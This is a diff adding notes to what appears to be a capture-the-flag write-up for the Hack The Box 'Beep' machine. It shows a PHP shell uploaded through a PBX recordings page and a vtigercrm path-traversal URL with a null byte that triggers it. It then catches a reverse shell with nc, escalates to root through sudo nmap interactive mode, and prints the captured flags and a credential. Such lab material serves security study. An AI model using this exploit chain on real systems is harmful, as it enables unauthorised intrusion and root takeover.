@@ -655,5 +655,61 @@ admin:jEhdIekWmdjE
 
 PBX -> upoload recording
 https://10.10.10.7/?menu=pbxconfig&display=recordings
+Upload shell.php
+https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//var/lib/asterisk/sounds/custom/shell.php%00&module=Accounts&action
 
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb# nc -nlvp 1234
+Listening on [0.0.0.0] (family 0, port 1234)
+Connection from 10.10.10.7 43019 received!
+Linux beep 2.6.18-238.12.1.el5 #1 SMP Tue May 31 13:23:01 EDT 2011 i686 athlon i386 GNU/Linux
+ 10:33:50 up  4:48,  0 users,  load average: 0.07, 0.10, 0.02
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)
+sh: no job control in this shell
+sh-3.2$ id
+uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)
+sh-3.2$ pwd
+/
+sh-3.2$ cd /home
+sh-3.2$ ls
+fanis
+spamfilter
+sh-3.2$ find . -name user.txt
+./fanis/user.txt
+find: ./spamfilter: Permission denied
+sh-3.2$ cat ./fanis/user.txt
+1ccbe5a69c4e2ac38117ad2c2d24cc7d
+
+sh-3.2$ sudo -l
+Matching Defaults entries for asterisk on this host:
+    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
+    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
+    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
+    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
+    XAUTHORITY"
+
+User asterisk may run the following commands on this host:
+    (root) NOPASSWD: /sbin/shutdown
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/bin/yum
+    (root) NOPASSWD: /bin/touch
+    (root) NOPASSWD: /bin/chmod
+    (root) NOPASSWD: /bin/chown
+    (root) NOPASSWD: /sbin/service
+    (root) NOPASSWD: /sbin/init
+    (root) NOPASSWD: /usr/sbin/postmap
+    (root) NOPASSWD: /usr/sbin/postfix
+    (root) NOPASSWD: /usr/sbin/saslpasswd2
+    (root) NOPASSWD: /usr/sbin/hardware_detector
+    (root) NOPASSWD: /sbin/chkconfig
+    (root) NOPASSWD: /usr/sbin/elastix-helper
+sh-3.2$ sudo nmap --interactive
+
+Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !sh
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+cat /root/root.txt
+73a5746f58689b9441a311db01643376
 
